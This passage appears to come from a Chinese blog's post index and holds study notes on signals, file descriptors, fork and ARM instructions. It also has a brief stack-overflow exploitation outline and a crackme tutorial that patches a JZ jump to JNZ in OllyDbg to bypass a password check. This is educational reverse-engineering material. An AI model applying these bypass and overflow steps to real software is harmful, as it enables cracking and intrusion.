小结\n\n主要是说了栈溢出的利用方式，分析流程：\n\n```\n修改返回地址：\n1、首先要找到返回地址（EBP的旁边）\n2、查读取的参数是否能覆盖返回地址，如果能覆盖，就有可能修改返回地址\n\n代码注入：\n1、首先要查看调用函数在内存中的入口地址\n2、构造代码\n3、查看参数进入之后的起始地址\n4、将返回地址位置覆盖为参数的起始地址\n```\n\n","categories":["二进制相关"]},{"title":"0Day漏洞挖掘_1.0_crackme","url":"/2021/04-22-0Day漏洞挖掘_1.0_crackme/","content":"\n0day安全的第一个小程序，代码如下：\n\n```c\n// Crack1.cpp : Defines the entry point for the console application.\n//\n\n#include <stdio.h>\n#include <string.h>\n\n#define PASSWORD \"1234567\"\n\nint verify_password (char *password)\n{\n\tint authenticated;\n\tauthenticated = strcmp(password,PASSWORD);\n\treturn authenticated;\n\n}\n\nmain(int argc, char* argv[])\n{\n\tint valid_flag = 0;\n\tchar password[1024];\n\twhile(1)\n\t{\n\t\tprintf(\"please input password : \");\n\t\tscanf(\"%s\",password);\n\t\tvalid_flag = verify_password(password);\n\t\tif (valid_flag)\n\t\t{\n\t\t\tprintf(\"password error ~\\n\\n\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintf(\"right password!!!\");\n\t\t\tbreak;\n\t\t}\n\t}\n}\n```\n\n使用VC6++编译成为exe文件\n\n## IDA的简单使用\n\n直接打开IDA窗口，然后将exe文件拖入界面：\n\n![image-20210422223339974](0Day漏洞挖掘_1.0_crackme.assets/image-20210422223339974.png)\n\n会出现下面这种样式的界面\n\n将鼠标要放在main函数的位置，按下F12才会显示逻辑图：\n\n![image-20210422224409370](0Day漏洞挖掘_1.0_crackme.assets/image-20210422224409370.png)\n\n可以看到，这里有一个jz，也就是if分支，如果正确，跳转到true分支，图中的这个jz就是关键跳转位置，前面的004010D5是VA地址，也就是说已经转换之后的。VA就是运行时的内存地址：004010D5。\n\n![image-20210422225411969](0Day漏洞挖掘_1.0_crackme.assets/image-20210422225411969.png)\n\n## OllyDbg的使用\n\n直接拖入Ollydbg，图中，图中第三个箭头指向的Call，就是调用main函数\n\n![image-20210422231538635](0Day漏洞挖掘_1.0_crackme.assets/image-20210422231538635.png)\n\n如果此时按F7就会进入函数内\n\n这里也可以直接按`Ctrl+G`\n\n![image-20210422232758762](0Day漏洞挖掘_1.0_crackme.assets/image-20210422232758762.png)\n\n按下F2可以下断点，然后直接F9会执行到断点位置\n\n![image-20210422234616298](0Day漏洞挖掘_1.0_crackme.assets/image-20210422234616298.png)\n\n直接双击JZ，然后可以修改成JNZ\n\n![image-20210422235823254](0Day漏洞挖掘_1.0_crackme.assets/image-20210422235823254.png)\n\n然后执行就是上面图的`right password!!!`\n\n## 小结\n\n这个主要说明了几个要点：\n\n```\n1、IDA的简单使用：\n\t直接拖入文件，即可自动显示出运行时的内存地址。\n\t鼠标放在main函数中，按F12即可看到逻辑图\n\n2、Ollydbg的简单使用\n\tF2 下断点\n\tF7 单步运行，遇见函数会进去\n\tF8 单步运行，遇见函数不会进去\n\tF9 运行到断点或者需要输入或者不能运行的位置\n\tCtrl+G 直接跳转到输入的内存地址位置\n\t双击指令，可以修改，但是重新执行的时候不会生效(是在内存里修改的)\n\n3、如何分析\n\t1) 先拖进IDA看流程，或者是运行时的内存地址，再结合ollydbg看起来比较方便\n\t2) 直接到Ollydbg中Ctrl+G查找if的位置，也就是JZ指令的位置，然后修改指令，既可绕过\n```\n\n","categories":["二进制相关"]},{"title":"深入理解计算机系统_一文搞懂信号","url":"/2021/03-26-深入理解计算机系统_一文搞懂信号/","content":"\n\n\n本文将按照以下流程来了解信号相关的内容\n\n```\n1、什么是信号\n2、进程接收信号的流程\n3、如何发送和接收信号\n4、信号的阻塞\n```\n\n# 1、什么是信号\n\n先看看书中的理解：\n\n![image-20210326153035904](深入理解计算机系统_一文搞懂信号.assets/image-20210326153035904.png)\n\n再打个比方，我们在运行一些程序的时候，按下`Ctrl+C`，程序就会中断并停止运行。那`Ctrl+C`这个动作就是对进程发送了一个信号，这个信号被系统归类为SIGINT类型，系统一共有很多种类型的信号，参见下表。\n\n再比如说我们平时想终止一个进程的时候会使用kill命令：`kill -9 pid`来终止一个进程，那就是对进程发送了序号为9，名称为SIGKILL的信号。\n\n![image-20210326153339855](深入理解计算机系统_一文搞懂信号.assets/image-20210326153339855.png)\n\n# 2、进程接收信号的流程\n\n## 书本\n\n这一块内容其实在书中有提到：\n\n![image-20210326155631127](深入理解计算机系统_一文搞懂信号.assets/image-20210326155631127.png)\n\n## 概念\n\n但是我看完之后实际是有点懵的，这里再说一下\n\n首先理解关于信号的几个概念，首先是两种状态：\n\n```\npending 待处理，也被成为信号未决，表示的是 信号产生之后到送达之前的状态\n\t比如发送的过程中(极小的时间)，处于阻塞中的信号也是pending的状态\n\ndelivery 信号递达，指的是处理信号的过程，一般处理有几种方式(对应的是下面内核表中的handler)：\n\t1) 忽略信号\n\t2) 执行默认动作(一般是终止进程)\n\t3) 自定义动作\n```\n\n在看一下阻塞\n\n```\nblock 阻塞，阻塞实际上是一个概念，不是一种状态，阻塞说的是进程收到了信号，但是不作处理\n\t就好比你收到了一件快递，快递已经送到了你门口，但是你把门关上了，不让快递进门，就让快递在外面等一会，等你需要这个信号进来的时候才开门让他进来\n\t或者说比如你按下了Ctrl+C，但是程序可以设置先阻塞这种类型的信号，等过了十秒钟之后再接收Ctrl+C\n```\n\n## 内核中维护信号的表\n\n**这一小节可以先跳过看完下面的例子再回头看**\n\n上文说到，进程是如何判断有没有信号发给自己，信号又是通过什么来阻塞或者处理的呢？\n\n这里就要说到PCB的概念，PCB是进程控制块，每个进程都有一个PCB来维护这个进程的相关信息，Linux内核的进程控制块是**task_struct结构体**，**是一个结构体**，那下图中的block、pending、handler都是结构体中的其中一部分内容\n\n![Linux信号处理机制](深入理解计算机系统_一文搞懂信号.assets/6753d6428de7391b17c642a30535b617.png)\n\n三个表分别是什么意思\n\n```\nblock 这个表中的值从上到下为011，它表示的是这个进程会阻塞SIGINT、SIGQUIT类型的信号，下面还有很多种类型的信号，不过没有显示\npending 这个表中的值从上到下为010，它表示的是目前有一个SIGINT的类型的信号正在被阻塞\n\t如果有多个SIGINT类型的信号被阻塞，也只阻塞一个\n\t如果这个SIGINT类型的信号被接收了，那么这个位置就会从1设置为0\nhandler 这个表表示系统如何处理信号\n\t有三种结果：默认(SIG_DFL)/忽略(SIG_IGN)/自定义(handler，也就是一个函数指针)\n```\n\n这里说到的全都是概念，下面我们用实际的代码来演示如何发送、接收、阻塞信号\n\n# 3、如何发送和接收信号\n\n## 发送信号\n\n发送信号比较好理解，主要就是下面几种\n\n```\n1、通过/bin/kill发送信号\n2、从键盘发送信号\n\tCtrl+C 内核发送一个SIGINT信号到前台进程组中的每个进程\n\tCtrl+Z 内核发送一个SIGTSTP信号到前台进程组中的每个进程\n3、kill函数发送信号\n\t#include <signal.h>\n\tint kill(pid_t pid, int sig);\n4、alarm函数发送信号\n\t#include <unistd.h>\n\tunsigned int alarm(unsigned int secs);\n```\n\n## 接收信号\n\n一般情况下，进程会默认接收信号，这里说的是我们如何通过系统函数来控制信号的接收，我们想要接收信号供我们的程序使用需通过`signal函数`：\n\n```c\n#include <signal.h>\ntypedef void(*sighandler_t)(int);\n\nsighandler_t signal(int signum, sighandler_t handler);\n\n// 参数signum表示信号类型，比如设置为SIGINT类型就在接收到SIGINT类型的信号时执行handler操作\n// 参数handler就是上面的表中的内容\n//\t默认(SIG_DFL)\t表示按默认情况执行\n//\t忽略(SIG_IGN) 忽略类型为signum的信号,比如第一个参数signum设置为SIGINT类型就会忽略SIGINT类型的信号\n//\t自定义(handler，也就是一个函数指针) 表示接收到signum类型的信号就执行这个函数\n```\n\n这里看一个实例：\n\n```c\n#include <signal.h>\n\nvoid sigint_handler(int sig)\n{\n        printf(\"caught sigint %d\\n\",sig);\n        exit(0);\n}\n\nint main()\n{\n        //接收到信号了之后执行sigint_handler函数\n        if(signal(SIGINT, sigint_handler) == SIG_ERR)\n              printf(\"sigint error\");\n\n        printf(\"aa\\n\");\n    \t//pause()会令目前的进程暂停(进入睡眠状态), 直到被信号中断\n        pause();\n        return 0;\n}\n```\n\n![image-20210324205507556](深入理解计算机系统_一文搞懂信号.assets/image-20210324205507556.png)\n\n这里引用的sigint_handler函数，signal收到一个`Ctrl+C`信号之后结束程序`exit(0);`还会将一串字符以及signum打印到屏幕上。\n\n注：sigint_handler函数只能接收一个参数，如果写入了多个参数，那么会自动接收第一个参数作为sig的值，这里写了一个char类型的，然后输出了转换成了char类型的值，如果想接收多个参数有其他用法，目前没研究\n\n![image-20210325095422524](深入理解计算机系统_一文搞懂信号.assets/image-20210325095422524.png)\n\n# 4、信号的阻塞\n\n上文中说到了信号阻塞的概念，在编程时可以使用sigprocmask函数来阻塞信号，sigprocmask函数可以选择不同的信号类型（比如SIGINT）进行阻塞\n\n![image-20210325132234460](深入理解计算机系统_一文搞懂信号.assets/image-20210325132234460.png)\n\n这里再对sigprocmask函数的三个参数做一下通俗的解释：\n\n```\n第一个参数how ： \n\tSIG_BLOCK 表示在blocked中添加第二个参数set中包含的信号类型，也就是在原来的基础上多阻塞一种或多种类型\n\tSIG_UNBLOCK 表示从blocked中删除第二个参数set中包含的信号类型，也就是在原来的基础上少阻塞一种或多种类型\n\tSIG_SETMASK 表示直接用set的内容替换blocked的内容,比如原来阻塞了1234四种信号,如果此时set为1,那么会直接只阻塞1类型信号\n第二个参数 ： mask通过上面的函数添加了SIGINT，表示阻塞SIGINT类型信号\n```\n\n除了第一个sigprocmask函数之外，其他的函数可以说都是为了配合sigprocmask函数使用的：\n\n![image-20210325110243275](深入理解计算机系统_一文搞懂信号.assets/image-20210325110243275.png)\n\n## 例一\n\n这里没有使用阻塞\n\n```c\n#include <signal.h>\n\nint main()\n{\n        int j = 0;\n        while (j<20)\n        {\n                printf(\"j = %d\\n\",j);\n                j++;\n                sleep(1);\n        }\n        pause();\n        return 0;\n}\n```\n\n编译执行之后循环输出j的值，按下`Ctrl+C`则程序终止\n\n![image-20210325110353416](深入理解计算机系统_一文搞懂信号.assets/image-20210325110353416.png)\n\n## 例二\n\n将程序修改一下，使用sigprocmask：\n\n```c\n#include <signal.h>\n\nint main()\n{\n        sigset_t mask, prev_mask;\n        sigemptyset(&mask);\n        sigaddset(&mask, SIGINT);\n\t   \n        // 将SIGINT类型的信号阻塞，blocked表中的SIGINT位会被标记为1\n        sigprocmask(SIG_BLOCK,&mask, &prev_mask);\n\n        int j = 0;\n        while (j<20)\n        {\n                printf(\"j = %d\\n\",j);\n                j++;\n                sleep(1);\n        }\n        pause();\n        return 0;\n}\n```\n\n可以看到，`Ctrl+C`已经无法中断程序了，因为`Ctrl+C`产生的信号被阻塞了，此时pending表的SIGINT位会置为1，因为接收到了一个SIGINT类型的信号，但是pending状态\n\n![image-20210325110543745](深入理解计算机系统_一文搞懂信号.assets/image-20210325110543745.png)\n\n这个例子只阻塞了信号，没有在阻塞之后放开信号\n\n## 例三\n\n如何将程序恢复到能够接收SIGINT信号的状态呢？还是使用sigprocmask\n\n```c\n#include <signal.h>\n\nint main()\n{\n        sigset_t mask, prev_mask;\n        sigemptyset(&mask);\n        sigaddset(&mask, SIGINT);\n\t   \n        // 将SIGINT类型的信号阻塞，blocked表中的SIGINT位会被标记为1\n        sigprocmask(SIG_BLOCK,&mask, &prev_mask);\n\n        int j = 0;\n        while (j<5)\n        {\n                printf(\"j = %d\\n\",j);\n                j++;\n                sleep(1);\n        }\n    \t// 这里使用函数sigprocmask然后将第一个参数设置为SIG_UNBLOCK，也就是把set的值(SIGINT)从blocked中删除(置为0)，删除之后被阻塞的信号会继续接收\n        sigprocmask(SIG_UNBLOCK,&mask, &prev_mask);\n        pause();\n        return 0;\n}\n```\n\n下面将编译好的文件执行了两次，一次是过程中按下`Ctrl+C`，一次是循环执行结束之后按下`Ctrl+C`，根据结果可以得出结论就是：\n\n```\n在设置了SIG_UNBLOCK之后：\n如果之前有阻塞的信号，则程序会将之前阻塞的信号重新接收\n如果之前没有被阻塞的信号，那么现在再次发送`Ctrl+C`时，程序能够正常接收\n```\n\n![image-20210325112254441](深入理解计算机系统_一文搞懂信号.assets/image-20210325112254441.png)\n\n","categories":["计算机基础"]},{"title":"深入理解计算机系统_文件描述符详解","url":"/2021/03-18-深入理解计算机系统_文件描述符详解/","content":"## 什么是文件描述符\n\n文件描述符英文全称为`file descriptor`，简称fd\n\n实际就是一个索引，能够根据这个索引查看到进程引用了哪些文件(Linux一切皆文件)，另一层理解就是，fd是进程的其中一个属性\n\n最为人熟知的文件描述符就是编号为012的fd，分别是输入输出和\n\n```\nstdin fd 0\t标准输入\nstdout fd 1\t标准输出\nstderr fd 2\t标准错误\n```\n\n文件描述符的最大值为1024\n\n## 如何查看一个进程的文件描述符\n\n通过下面命令查看每个文件描述符对应的文件，proc目录下每个数字都是一个pid\n\n```\nll /proc/pid/fd\n或者是\nls //proc/pid/fd -l\n\nll /proc/8293/fd\n```\n\n![image-20210317110350364](深入理解计算机系统_文件描述符详解.assets/image-20210317110350364.png)\n\n这里可以通过查看进程8293的文件描述符查看引用了哪些文件，其中包括了socket文件\n\n有一个要注意的点是，一般情况下，数值为0和1的fd一般指向的是`/dev/pts/x`，也就是我们的命令行：\n\n![image-20210318163643961](深入理解计算机系统_文件描述符详解.assets/image-20210318163643961.png)\n\n## 一个例子\n\n这里用一个例子，来更好的理解fd\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nint main(){\n        int fd1,fd2;//在编程中，fd就是一个大于0的int类型的值\n\n        fd1 = open(\"foo.txt\",O_RDONLY, 0);\n        close(fd1);\n        fd2 = open(\"baz.txt\",O_RDONLY, 0);\n        printf(\"fd2 = %d\\n\", fd2);\n        sleep(100);//为了方便操作，所以sleep一下\n        exit(0);\n}\n```\n\n这里可以看到，使用printf的值为fd=3，通过ls -l命令查看就可以看到值为3的文件描述符确实是指向了baz.txt\n\n![image-20210318111444899](深入理解计算机系统_文件描述符详解.assets/image-20210318111444899.png)\n\n因为fd1被close了，所以在fd中看不到\n\n## 文件描述符与共享文件\n\n共享文件可以理解为多个进程或者多个fd指向相同的文件的机制，首先需要理解下面三个表\n\n```\n1、文件描述符表\n也就是一个进程的文件描述符\n\n2、文件表\n文件表是所有的打开的文件的集合，所有进程共享这张表，其中的每一项记录了不同文件的信息：\n\ta) 每个文件的位置\n\tb) 引用计数（当前有多少个fd指向这个文件）\n\tc) 指向v-node表中对应表项的指针\n关闭一个fd(比如close(fd))，这个fd指向的文件的引用计数就会-1\n\n3、v-node表\n所有进程共享这张表，每个表项包含stat结构中的大多数信息\n\n```\n\n参考下面几个图理解三个表的对应关系：\n\n![image-20210318160218741](深入理解计算机系统_文件描述符详解.assets/image-20210318160218741.png)\n\n![image-20210318160302934](深入理解计算机系统_文件描述符详解.assets/image-20210318160302934.png)\n\nfork之后父子进程共享文件的情况：\n\n![image-20210318160319187](深入理解计算机系统_文件描述符详解.assets/image-20210318160319187.png)\n\n## 文件描述符与重定向\n\n重定向符：\n\n```\n> 复写\n>>\t追加\n```\n\n这里使用echo和重定向符写个aaa到`test.txt`中：\n\n![image-20210318162245272](深入理解计算机系统_文件描述符详解.assets/image-20210318162245272.png)\n\n实际上就是把原本输入到标准输出的字符aaa，导向了test.txt文件\n\n![image-20210318163231093](深入理解计算机系统_文件描述符详解.assets/image-20210318163231093.png)\n\n上图可以看到，标号为1的fd代表的是标准输出，一般情况下指向`/dev/pts/x`，重定向就是将其修改为指向`test.txt`文件\n\n使用linux提供的函数dup2能达到相同的目的\n\n![image-20210318171308576](深入理解计算机系统_文件描述符详解.assets/image-20210318171308576.png)\n\n复制oldfd到newfd，也就是说让newfd指向oldfd指向的文件\n\n原书中的例子是：\n\n```c\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nint main()\n{\n        int fd1,fd2;\n        char c;\n\n        fd1 = open(\"foo.txt\",O_RDONLY, 0);//foo.txt内容为foobar\n        fd2 = open(\"foo.txt\",O_RDONLY,0);\n        read(fd2, &c , 1);\n        dup2(fd2,fd1);\n        read(fd1 , &c , 1);\n        printf(\"c = %c\\n\", c);\n        exit(0);\n}\n```\n\n输出结果为：\n\n![image-20210318175013290](深入理解计算机系统_文件描述符详解.assets/image-20210318175013290.png)\n\n修改一下更能看出dup2的作用\n\n```c\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nint main()\n{\n        int fd1,fd2;\n        char c;\n\n        fd1 = open(\"foo.txt\",O_RDONLY, 0);\n        fd2 = open(\"baz.txt\",O_RDONLY,0);\n        read(fd1, &c , 1);\n        printf(\"c = %c\\n\", c);// c = a\n        read(fd2, &c , 1);\n        printf(\"c = %c\\n\", c);// c = b\n    \t//sleep(20)\n        dup2(fd2,fd1);\n        read(fd1 , &c , 1);\n        printf(\"c = %c\\n\", c);// c = b\n    \t//sleep(20)\n        exit(0);\n}\n```\n\n![image-20210318172519440](深入理解计算机系统_文件描述符详解.assets/image-20210318172519440.png)\n\n这里可以看到，结果，是将fd1原本read的内容是`foo.txt`文件中的a，使用dup2之后指向了`baz.txt`\n\n加个sleep函数，使用ls函数看一下：\n\n![image-20210318173109405](深入理解计算机系统_文件描述符详解.assets/image-20210318173109405.png)\n\n可以看到在执行了dup2之后值为3和4的fd都指向了`baz.txt`，也就是fd2指向的文件","categories":["计算机基础"]},{"title":"深入理解计算机系统_一文搞懂fork函数","url":"/2021/02-23-深入理解计算机系统_一文搞懂fork函数/","content":"\n# fork函数简介\n\nfork函数的作用是创建一个当前进程的进程副本，这个副本有单独的pid，属于当前进程的子进程\n\n```c\n#include <sys/types.h>\n#include <unistd.h>\n\npid_t fork(void);\n\n// fork的返回值有三种情况\n// >0 表示在父进程中\n// =0 表示在子进程中\n// <0 表示创建子进程失败\n```\n\n关于fork函数的几个点：\n\n```\nfork函数创建一个进程副本，副本拥有新的pid，也就是说这个副本是一个独立的子进程\n\nfork出来的子进程和父进程代码执行的进度是一样的，比如父进程执行到了代码的第10行，fork之后，子进程也从第10行开始执行\n\nfork之后，是两份代码一起在执行，通过pid判断是父进程还是子进程，这时是两份代码执行（子进程和父进程分别执行自己的代码），不是一份代码在执行\n```\n\nFork之后的进程可以理解为下图的情形，当父进程执行到fork时，创建了一个进程副本，此时，父进程和子进程执行到了相同的代码位置\n\n![image-20210223191849099](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223191849099.png)\n\n这里也可以参考一下书中的图示：\n\n![image-20210212222255599](深入理解计算机系统_一文搞懂fork函数.assets/image-20210212222255599.png)\n\n# 实例\n\n上面简单了解了fork函数的作用，下面用几个实例来看一下，并且注意观察几个实例的区别\n\n## 例1\n\n直接使用fork函数，然后printf一个字符串：\n\n```c\n#include <stdio.h>\n\nint main()\n{\n        fork();\n        printf(\"test aaa\");//注意这里没有\\n\n        return 0;\n}\n```\n\n输出了两次\n\n![image-20210223193113102](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223193113102.png)\n\n这里我们就知道了，fork会创建副本进程(子进程)\n\n## 例2\n\n直接printf一个字符串，然后使用fork函数\n\n```c\n#include <stdio.h>\n\nint main()\n{\n        printf(\"test aaa\");//注意这里没有\\n\n        fork();\n        return 0;\n}\n```\n\n![image-20210223100914234](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223100914234.png)\n\n这里看到输出两个`test aaa`，和例1中的一样\n\n## 例3\n\n使用换行符：\n\n```c\n#include <stdio.h>\n\nint main()\n{\n        printf(\"test aaa\\n\");// 使用了换行符\n        fork();\n        return 0;\n}\n```\n\n![image-20210223101532429](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223101532429.png)\n\n为什么上面两个输出了两次，而加了`\\n`之后输出了一次呢？\n\n```\n是因为printf在运行时，如果最后没有\\n换行符，是不会直接将字符串打印到屏幕中的，只会放到stdout的缓冲区中，在等到进程结束的时候才会将缓冲区中的内容打印到屏幕上\n\n这也是为什么例2中，fork函数在printf之后，按理说在创建了副本之后子进程不会执行printf，也就不会输出字符串，但是仍然输出了\"test aaa\"的原因\n在创建副本的时候，副本的缓冲区也存了这个值，然后在最后进程结束的时候，字符从缓冲区被打印到了屏幕上\n```\n\n## 例4\n\n再改一下来验证上面的结论：\n\n```c\n#include <stdio.h>\n\nint main()\n{\n        printf(\"test aaa\\nnnnnn\");//这里使用了一个 \\n\n        fork();\n        return 0;\n}\n```\n\n可以看到，\\n之前的输出一次，之后的输出两次，因为\\n之前的，立即就输出了，而\\n之后的，保存在了缓冲区，在进程结束的时候，才打印到屏幕上\n\n![image-20210223101905357](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223101905357.png)\n\n## 例5\n\n这个例子教我们如何判断父进程还是子进程，fork的返回值如果是0，则就是在子进程中，如果不是0则在父进程中，这样我们就可以实现父进程和子进程运行不同的代码\n\n这是一个书中的例子：\n\n```c\n#include <unistd.h>\n#include <stdio.h>\n\nint main()\n{\n        int x = 1;\n\n        if(fork()==0){\n                printf(\"a\");fflush(stdout);//这一段在子进程的进程副本中运行\n        }\n        else{\n                printf(\"b\");fflush(stdout);//这一段在父进程的进程副本中运行\n                waitpid(-1,NULL,0);// 等待所有子进程\n        }\n        printf(\"c\"); fflush(stdout);\n        exit(0);\n}\n```\n\n执行之后：\n\n![image-20210212221952184](深入理解计算机系统_一文搞懂fork函数.assets/image-20210212221952184.png)\n\n顺序是`bacc`，这里解释一下为什么是这个顺序：\n\n```c\n// fork执行之后，一个进程变成两个进程，父进程和子进程，在子进程中fork的返回值为0，执行的是：\nprintf(\"a\");fflush(stdout);\nprintf(\"c\"); fflush(stdout);\n\n// 父进程中执行的是\nprintf(\"b\");fflush(stdout);\nprintf(\"c\"); fflush(stdout);\n\n// 这里fflush的作用就是把stdout打印到屏幕上并且清空，所以ab先被输出，cc后被输出，也就是bacc的结果\n```\n\n注意，这里b先被输出并不代表子进程先运行，目前没有文档定义到底在fork之后是子进程先运行还是父进程先运行，所以，我也不知道\n\n## 例6\n\n```c\n#include <unistd.h>\n#include <stdio.h>\n\nint main()\n{\n        int x = 1;\n\n        if(fork()==0){\n                printf(\"a\");//这一段在子进程的进程副本中运行\n        }\n        else{\n                printf(\"b\");//这一段在父进程的进程副本中运行\n                waitpid(-1,NULL,0);// 等待所有子进程\n        }\n        printf(\"c\"); fflush(stdout);\n        exit(0);\n}\n```\n\n输出为acbc，因为没有fflush，所以在printf之后，字符串被保存在缓冲区中，等到进程结束再打印到屏幕上，而子进程先结束，子进程结束之后父进程回收子进程的一些资源，然后再结束，所以是子进程的内容先输出\n\n![image-20210223195641027](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223195641027.png)\n\n另外，这里如果在abc后面加上`\\n`结果又会是bacc，\\n能起到和fflush类似的作用（将缓冲区的内容打印到屏幕）\n\n## 例7\n\n这里直接把waitpid注释掉\n\n```c\n#include <unistd.h>\n#include <stdio.h>\n\nint main()\n{\n        int x = 1;\n\n        if(fork()==0){\n                printf(\"a\\n\");//这一段在子进程的进程副本中运行\n        }\n        else{\n                printf(\"b\\n\");//这一段在父进程的进程副本中运行\n                //waitpid(-1,NULL,0);// 等待所有子进程\n        }\n        printf(\"c\\n\");\n        exit(0);\n}\n```\n\n结果为`bcac`，并且，格式还不一样，因为父进程没有等待子进程回收完毕，就提前结束所以更早的打印出`bc`，导致子进程被内核安排init进程作为他的的养父，init进程的pid为1，是所有进程的祖先\n\n![image-20210223200246438](深入理解计算机系统_一文搞懂fork函数.assets/image-20210223200246438.png)\n\n## wait、waitpid\n\n通过上面的例子也可以了解了，wait和waitpid的作用就是：\n\n```\n等待进程状态的改变，并且回收子进程占用的资源\n```\n\n使用方法自行百度吧","categories":["计算机基础"]},{"title":"计算机组成原理_3.6_ARM的流控制指令","url":"/2021/01-20-计算机组成原理_3.6_ARM的流控制指令/","content":"\n流控制通俗点的说就是控制指令的执行顺序，通过各种类型的条件分支来实现。\n\n# 无条件分支\n\n```\nB target\ntarget表示分支目标地址\n```\n\n在高级语言中无条件叫做goto\n\n# 条件分支\n\n比如：\n\n```\nIF (X == Y)\n\tTHEN Y = Y + 1;\n\tELSE Y = Y + 2;\n```\n\n","categories":["计算机基础"]},{"title":"计算机组成原理_3.5_ARM数据处理指令","url":"/2021/01-17-计算机组成原理_3.5_ARM数据处理指令/","content":"\n数据处理指令，处理数据并产生新的值。\n\n# 算术指令\n\n```\n加法 ADD\n减法 SUB\n取负 NEG\n比较 CMP\n乘法 MUL\n移位 LSL,LSR,ASL,ASR,ROL,ROR\n```\n\n## 1、加减法\n\n除了将两个字相加的操作之外，大多数微处理器都实现了带进位的加法指令，能够将两个操作数和条件码寄存器中的进位位加到一起。\n\n实现进位使用的就是`当前处理器状态寄存器（CPSR）`中的进位位（C），进位会存放到进位标志位中。\n\n### 单/双精度加法\n\n```assembly\nADD r2,r0,r1\n```\n\n这时如果r0+r1产生了进位，那么进位会被放入进位标志位C中，r2得到的是没有进位的结果\n\n这里助记符ADC，实际也算一个伪指令\n\n```\nADC 表示带进位的加法\nADDS 表示强制更新进位位\n```\n\n书中的例子：如何使用32位的处理器完成64位整数的加法：\n\n![image-20210118110605207](计算机组成原理_3.5_ARM数据处理指令.assets/image-20210118110605207.png)\n\n### 逆减法\n\n逆减法指令为RSB，例：\n\n```assembly\nSUB r1,r2,r3\n;表示的是 [r1] <- [r2] - [r3]\n\nRSB r1,r2,r3\n;表示的是 [r1] <- [r3] - [r2]\n```\n\n## 2、取负\n\n取负就是零减去一个数字，r0的负数就是0-[r0]，ARM没有取负指令，所以可以使用逆减法实现\n\n```assembly\nRSB r1,r1,#0\n```\n\n书中还说到了取反传送的操作：\n\n```assembly\nMVN r0,r1\n;将r1的值逻辑取反之后传入r0中\n```\n\n## 3、比较\n\n实现条件操作，就必须使用`比较运算`，比较运算可以分为隐式和显式两种\n\n### 隐式\n\n```assembly\nSUBS r1,r1,#1\n;如果结果为0则CCR中的Z标志位会被置为1\n```\n\n### 显式\n\nCMP指令会计算Q-P，但是不会保存结果，\n\n```assembly\nCMP Q,P\n\nCMP r0,r1\n;计算[r0] - [r1],并更新相应的状态位\n```\n\n## 4、乘法\n\nARM的乘法限制：\n\n```\n被乘数不能为常量\n第二操作数也不能移位\n```\n\nARM的乘法：\n\n```assembly\nMUL ;32位乘法指令\nUMULL ;无符号长整形乘法\nUMLAL ;无符号长整形乘累加\nSMULL ;有符号长整形乘法\nSMLAL ;有符号长整形乘累加\n```\n\n```assembly\nMUL Rd,Rm,Rs\n;计算保存在32位寄存器Rd中，仅存放64位积的低32位。\n```\n\n乘累加，乘累加操作用一条指令完成乘法和加法运算，支持内积计算。\n\n```assembly\nMLA Rd,Rm,Rs,Rn\n;意思是 [Rd] <- [Rm] * [Rs] + [Rn]\n```\n\n## 5、除法\n\nARM没有实现除法运算，需要程序员自己实现\n\n# 位操作\n\n## 逻辑指令\n\n逻辑操作也叫位操作，因为这些操作被应用到寄存器的每一位。\n\n```\nAND\t与\t两个1得1，其他为0\nOR\t或\t有一个1就为1\nNOT\t非\t直接把0和1互换\nEOR\t逻辑异或\t相同为0，不同为1\n```\n\nARM中是没有NOT指令的，所以可以使用EOR来实现NOT的效果，例：\n\n```assembly\n;取一个数的NOT\nEOR r0,r0,#1\n;如果r0是1,则相同异或为0,如果为0,则不同异或之后为1\n```\n\n书中的例子：将8位2进制串abcdefgh的b、d两位清0，a、e、f三位置为1，h位取反\n\n```assembly\nAND r0,r0,#2_10101111\nOR  r0,r0,#2_10001100\nEOR r0,r0,#2_00000001\n```\n\n## 清除指令\n\n```assembly\n;BIC指令\nBIC r0,r1,r2\n;BIC将第一个操作数和第二个操作数的反码，进行与(AND)操作\n```\n\n可以使用BIC指令对寄存器的最低字节清0：\n\n```assembly\nBIC r0,r1,#0xFF\n```\n\n# 移位操作\n\n## 逻辑移位\n\n所有的微处理器都支持逻辑移位操作\n\n```\n如果移位的位数在指令中被编码为常量，这种移位叫做静态操作\n\n如果移位的位数由寄存器的值指令，则叫做动态移位\n```\n\n逻辑移位中左右移时，零移进去，另一头的被复制到条件码寄存器的进位位\n\n```\nLSL 逻辑左移\nLSR 逻辑右移\n```\n\n## 算术移位\n\n算术左移（ASL）和右移（ASR）相当于乘以2和除以2\n\n```\n左移在右边补0\n右移的话最高一位用符号位补充\n```\n\n移出去的位被放到进位位\n\n```\n逻辑左移和算术左移是相同的结果\n```\n\n## 循环移位\n\n循环操作中，移出的一位会被复制到另一端的空出位\n\n```\n循环左移 ROL\n循环右移 ROR\n```\n\n## ARM对于位操作的实现\n\nARM的移位处理机制中设置了一个桶型移位器，移位器通过组合逻辑实现数据左移或者右移，而没有使用移位寄存器。\n\n使用指令控制移位：\n\n```assembly\nADD r0,r1,r2, LSL #1\n;RTL:\n;[r0] <- [r1] + [r2] * 2\n\nMOV r3,r3, LSL #1\n;将r3中的值左移移位，也就是*2\n```\n\nARM中实现的几个移位指令：\n\n```\nLSL 逻辑左移\nLSR 逻辑右移\nASR 算术右移\nROR 循环右移\nRRX 带进位的循环右移(移位一次)\n```\n\n这里RRX相当于循环中把CPSR（当前处理器状态处理器）中的C位（进位位）加入了循环中\n\nARM中支持动态和静态移位：\n\n```assembly\nMOV r3,r3, LSL #1\t;静态移位\nMOV r3,r3, LSL r2\t;动态移位，移位位数为r2寄存器中的值\n```\n\n## 移位与C语言的关系\n\nC语言指针中通过偏移量去访问数据的时候就可以用到移位：\n\n```c\n*P_int = *P_int + 4 * offset;\n```\n\n假设*P_int在寄存器r0中，offset偏移量在寄存器r1中，则可以通过下面的指令极端偏移量：\n\n```assembly\nADD r0,r0,r1, LSL #2\n```\n\n# 